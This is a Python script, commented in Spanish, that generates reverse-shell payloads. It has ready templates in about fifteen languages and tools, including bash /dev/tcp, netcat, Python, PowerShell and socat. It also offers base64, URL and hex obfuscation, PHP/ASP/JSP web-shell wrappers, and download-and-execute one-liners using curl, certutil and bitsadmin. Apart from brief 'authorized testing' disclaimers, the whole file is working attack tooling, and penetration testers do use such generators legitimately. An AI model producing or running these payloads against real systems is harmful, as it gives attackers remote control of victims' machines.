#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Generador de Reverse Shells
Este script genera diferentes variantes de reverse shells en múltiples lenguajes
y formatos, incluyendo opciones de codificación y obfuscación.
"""

import urllib.parse
import argparse
import sys
import os
import base64
import random
import string
import re
from typing import List, Dict, Any, Tuple
from colorama import Fore, Style, init

# Inicializar colorama para salida en color
init(autoreset=True)

class ReverseShellGenerator:
    """Clase para generar payloads de reverse shell en diferentes lenguajes"""
    
    def __init__(self):
        """Inicializa el generador con plantillas para diferentes lenguajes"""
        # Plantillas de reverse shells para diferentes lenguajes
        self.templates = {
            "bash": [
                "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
                "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
                "exec /bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
            ],
            "sh": [
                "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
                "/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1"
            ],
            "netcat": [
                "nc -e /bin/sh {ip} {port}",
                "nc -e /bin/bash {ip} {port}",
                "nc -c bash {ip} {port}",
                "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
            ],
            "python": [
                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ],
            "perl": [
                "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                "perl -MIO -e '$p={port};$i=\"{ip}\";socket(X,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(X,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&X\");open(STDOUT,\">&X\");open(STDERR,\">&X\");exec(\"/bin/sh -i\");}};'"
            ],
            "ruby": [
                "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
            ],
            "php": [
                "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "php -r '$sock=fsockopen(\"{ip}\",{port});`/bin/sh -i <&3 >&3 2>&3`;'",
                "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "<?php system(\"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); ?>",
                "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); ?>"
            ],
            "powershell": [
                "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
                "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
            ],
            "java": [
                "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor();"
            ],
            "nodejs": [
                "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"')",
                "(function(){{var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({port},\"{ip}\",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})()"
            ],
            "telnet": [
                "TF=$(mktemp -u); mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF 2>&1; rm -f $TF",
                "rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p 2>&1"
            ],
            "awk": [
                "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null"
            ],
            "lua": [
                "lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('{ip}',{port});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\""
            ],
            "golang": [
                "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
            ],
            "socat": [
                "socat TCP:{ip}:{port} EXEC:/bin/sh",
                "socat TCP:{ip}:{port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
            ]
        }
        
        # Métodos de codificación y ofuscación
        self.encoding_methods = [
            "base64",
            "url",
            "hex",
            "doubleURL"
        ]
    
    def format_payload(self, payload_template: str, ip: str, port: int) -> str:
        """
        Formatea la plantilla de payload con IP y puerto
        
        Args:
            payload_template: Plantilla del payload
            ip: Dirección IP del atacante
            port: Puerto para la conexión
            
        Returns:
            Payload formateado
        """
        return payload_template.format(ip=ip, port=port)
    
    def generate_shell_payloads(self, ip: str, port: int, language: str = None) -> Dict[str, List[str]]:
        """
        Genera payloads de reverse shell
        
        Args:
            ip: Dirección IP del atacante
            port: Puerto para la conexión
            language: Lenguaje específico (si es None, genera para todos)
            
        Returns:
            Diccionario con lenguajes y sus payloads
        """
        payloads = {}
        
        if language:
            if language not in self.templates:
                print(f"{Fore.RED}[!] Lenguaje '{language}' no soportado")
                return {}
            
            # Genera payloads solo para el lenguaje especificado
            templates = self.templates[language]
            formatted_payloads = [self.format_payload(template, ip, port) for template in templates]
            payloads[language] = formatted_payloads
        else:
            # Genera payloads para todos los lenguajes
            for lang, templates in self.templates.items():
                formatted_payloads = [self.format_payload(template, ip, port) for template in templates]
                payloads[lang] = formatted_payloads
        
        return payloads
    
    def encode_payload(self, payload: str, method: str) -> str:
        """
        Codifica un payload con el método especificado
        
        Args:
            payload: Payload original
            method: Método de codificación
            
        Returns:
            Payload codificado
        """
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "url":
            return urllib.parse.quote(payload)
        elif method == "doubleURL":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif method == "hex":
            return ''.join(['\\x'+format(ord(c), '02x') for c in payload])
        else:
            return payload
    
    def generate_encoded_payloads(self, payload: str) -> Dict[str, str]:
        """
        Genera versiones codificadas de un payload
        
        Args:
            payload: Payload original
            
        Returns:
            Diccionario con método de codificación y payload codificado
        """
        encoded = {}
        for method in self.encoding_methods:
            encoded[method] = self.encode_payload(payload, method)
        return encoded
    
    def generate_command_execution(self, payload: str, web_language: str) -> Dict[str, str]:
        """
        Genera wrappers para ejecución de comandos en diferentes contextos web
        
        Args:
            payload: Payload del reverse shell
            web_language: Lenguaje del servidor web (php, asp, etc.)
            
        Returns:
            Diccionario con wrappers para ejecución de comandos
        """
        wrappers = {}
        
        if web_language == "php":
            wrappers["system"] = f"<?php system('{payload}'); ?>"
            wrappers["exec"] = f"<?php exec('{payload}'); ?>"
            wrappers["shell_exec"] = f"<?php echo shell_exec('{payload}'); ?>"
            wrappers["passthru"] = f"<?php passthru('{payload}'); ?>"
            wrappers["backtick"] = f"<?php `{payload}`; ?>"
        
        elif web_language == "asp":
            wrappers["wscript"] = f"<% Dim oS\nSet oS = Server.CreateObject(\"WSCRIPT.SHELL\")\nCall oS.run(\"{payload}\", 0, True) %>"
            wrappers["exec"] = f"<% Dim oS\nSet oS = Server.CreateObject(\"WSCRIPT.SHELL\")\nDim output\noutput = oS.Exec(\"{payload}\").StdOut.ReadAll\nResponse.write(output) %>"
        
        elif web_language == "jsp":
            wrappers["runtime"] = f"<% Runtime.getRuntime().exec(\"{payload}\"); %>"
            wrappers["processbuilder"] = f"<% new ProcessBuilder(new String[]{{\"cmd.exe\", \"/c\", \"{payload}\"}}).start(); %>"
        
        return wrappers

    def generate_one_liner(self, payload: str, platform: str) -> Dict[str, str]:
        """
        Genera one-liners para diferentes plataformas
        
        Args:
            payload: Payload del reverse shell
            platform: Plataforma (linux, windows)
            
        Returns:
            Diccionario con one-liners
        """
        one_liners = {}
        
        if platform == "linux":
            one_liners["wget"] = f"wget -q -O- {payload} | sh"
            one_liners["curl"] = f"curl -s {payload} | sh"
            one_liners["fetch"] = f"fetch -o- {payload} | sh"
        
        elif platform == "windows":
            one_liners["powershell"] = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command {payload}"
            one_liners["certutil"] = f"certutil -urlcache -split -f {payload} evil.exe && evil.exe"
            one_liners["bitsadmin"] = f"bitsadmin /transfer n {payload} %temp%\\t.exe && %temp%\\t.exe"
        
        return one_liners
    
    def save_to_file(self, payloads: Dict[str, List[str]], filename: str, format_type: str = 'detailed') -> None:
        """
        Guarda los payloads en un archivo
        
        Args:
            payloads: Diccionario con lenguajes y sus payloads
            filename: Nombre del archivo de salida
            format_type: 'detailed' para formato con categorías, 'simple' para un payload por línea
        """
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                if format_type == 'detailed':
                    # Formato detallado con categorías
                    f.write("# Reverse Shell Payloads - Generados por Reverse Shell Generator\n\n")
                    
                    for language, shell_payloads in payloads.items():
                        f.write(f"## {language.upper()}\n\n")
                        
                        for i, payload in enumerate(shell_payloads, 1):
                            f.write(f"{i}. `{payload}`\n\n")
                            
                            # Añadir versiones codificadas
                            encoded = self.generate_encoded_payloads(payload)
                            f.write("   Versiones codificadas:\n")
                            for method, encoded_payload in encoded.items():
                                f.write(f"   - {method}: `{encoded_payload}`\n")
                            f.write("\n")
                        
                        f.write("\n")
                else:
                    # Formato simple (un payload por línea)
                    f.write("# Reverse Shell Payloads - Un payload por línea\n\n")
                    
                    for language, shell_payloads in payloads.items():
                        for payload in shell_payloads:
                            f.write(f"{payload}\n")
                            
                            # También guardar versiones codificadas
                            encoded = self.generate_encoded_payloads(payload)
                            for encoded_payload in encoded.values():
                                f.write(f"{encoded_payload}\n")
                        
            print(f"{Fore.GREEN}[+] Payloads guardados en '{filename}'")
        except IOError as e:
            print(f"{Fore.RED}[!] Error al guardar en el archivo: {e}")

    def save_burp_format(self, payloads: Dict[str, List[str]], filename: str) -> None:
        """
        Guarda los payloads en formato adecuado para Burp Suite (un payload por línea)
        
        Args:
            payloads: Diccionario con lenguajes y sus payloads
            filename: Nombre del archivo de salida
        """
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                # Formato simple (un payload por línea sin comentarios ni formato)
                for language, shell_payloads in payloads.items():
                    for payload in shell_payloads:
                        f.write(f"{payload}\n")
                        # También incluir versiones codificadas
                        encoded = self.generate_encoded_payloads(payload)
                        for encoded_payload in encoded.values():
                            f.write(f"{encoded_payload}\n")
                            
            total_payloads = sum(len(shell_payloads) for shell_payloads in payloads.values())
            total_with_encoded = total_payloads * (len(self.encoding_methods) + 1)  # +1 por el original
            print(f"{Fore.GREEN}[+] {total_with_encoded} payloads guardados en formato Burp Suite en '{filename}'")
        except IOError as e:
            print(f"{Fore.RED}[!] Error al guardar en el archivo: {e}")

def banner():
    """Muestra el banner del script"""
    banner_text = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.RED}  ____                          ____  _          _ _  {Fore.CYAN}║
{Fore.CYAN}║ {Fore.RED} |  _ \\ _____   _____ _ __ ___ / ___|| |__   ___| | | {Fore.CYAN}║
{Fore.CYAN}║ {Fore.RED} | |_) / _ \\ \\ / / _ \\ '__/ __|\\___ \\| '_ \\ / _ \\ | | {Fore.CYAN}║
{Fore.CYAN}║ {Fore.RED} |  _ <  __/\\ V /  __/ |  \\__ \\ ___) | | | |  __/ | | {Fore.CYAN}║
{Fore.CYAN}║ {Fore.RED} |_| \\_\\___| \\_/ \\___|_|  |___/|____/|_| |_|\\___|_|_| {Fore.CYAN}║
{Fore.CYAN}║                                                          ║
{Fore.CYAN}║ {Fore.GREEN}Generador de Reverse Shells                         {Fore.CYAN}║
{Fore.CYAN}║ {Fore.YELLOW}Uso educativo - v1.0                               {Fore.CYAN}║
{Fore.CYAN}╚════════════════════════════════════════════════════════╝
    """
    print(banner_text)

def main():
    """Función principal del script"""
    banner()
    
    parser = argparse.ArgumentParser(
        description='Generador de Reverse Shells - Crea payloads para pruebas de penetración autorizadas',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-i', '--ip', required=True,
                      help='Dirección IP para la conexión reversa (tu IP)')
    parser.add_argument('-p', '--port', type=int, required=True,
                      help='Puerto para la conexión reversa (tu puerto de escucha)')
    parser.add_argument('-l', '--language',
                      help='Lenguaje específico para el cual generar shells (por defecto: todos)')
    parser.add_argument('-o', '--output',
                      help='Archivo de salida para guardar los payloads')
    parser.add_argument('-ls', '--list', action='store_true',
                      help='Listar lenguajes disponibles')
    parser.add_argument('-b', '--burp', action='store_true',
                      help='Guardar en formato para Burp Suite (un payload por línea)')
    parser.add_argument('-e', '--encode',
                      help='Codificar payloads (base64, url, hex, doubleURL)')
    parser.add_argument('-w', '--web',
                      help='Generar wrappers para ejecución en entornos web (php, asp, jsp)')
    
    args = parser.parse_args()
    
    generator = ReverseShellGenerator()
    
    if args.list:
        print(f"{Fore.YELLOW}[*] Lenguajes disponibles:")
        for i, language in enumerate(sorted(generator.templates.keys()), 1):
            print(f"  {i:2d}. {language}")
        
        print(f"\n{Fore.YELLOW}[*] Métodos de codificación disponibles:")
        for i, method in enumerate(generator.encoding_methods, 1):
            print(f"  {i:2d}. {method}")
        return
    
    # Generar payloads
    payloads = generator.generate_shell_payloads(args.ip, args.port, args.language)
    
    if not payloads:
        if args.language:
            print(f"{Fore.RED}[!] No se pudieron generar payloads para el lenguaje '{args.language}'")
        else:
            print(f"{Fore.RED}[!] No se pudieron generar payloads")
        return
    
    # Mostrar los payloads generados
    for language, shell_payloads in payloads.items():
        print(f"{Fore.GREEN}[+] {language.upper()}:")
        
        for i, payload in enumerate(shell_payloads, 1):
            print(f"  {i:2d}. {Fore.WHITE}{payload}")
            
            # Si se ha especificado codificación, mostrar versión codificada
            if args.encode:
                if args.encode in generator.encoding_methods:
                    encoded = generator.encode_payload(payload, args.encode)
                    print(f"      {Fore.YELLOW}({args.encode}) {encoded}")
                else:
                    print(f"{Fore.RED}      Método de codificación '{args.encode}' no válido")
            
            # Si se ha especificado entorno web, mostrar wrapper
            if args.web:
                if args.web.lower() in ["php", "asp", "jsp"]:
                    wrappers = generator.generate_command_execution(payload, args.web.lower())
                    for wrapper_type, wrapper_code in wrappers.items():
                        print(f"      {Fore.CYAN}({wrapper_type}) {wrapper_code}")
                else:
                    print(f"{Fore.RED}      Entorno web '{args.web}' no soportado")
    
    # Guardar en archivo si se ha especificado
    if args.output:
        if args.burp:
            generator.save_burp_format(payloads, args.output)
        else:
            generator.save_to_file(payloads, args.output)
    
    # Mostrar estadísticas
    total_payloads = sum(len(shell_payloads) for shell_payloads in payloads.values())
    print(f"\n{Fore.CYAN}[*] Total de payloads generados: {total_payloads}")
    print(f"{Fore.YELLOW}[!] Recuerda usar estos payloads solo para pruebas autorizadas")
    print(f"{Fore.YELLOW}[!] Para escuchar conexiones: nc -lvnp {args.port}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Programa interrumpido por el usuario")
        sys.exit(0)
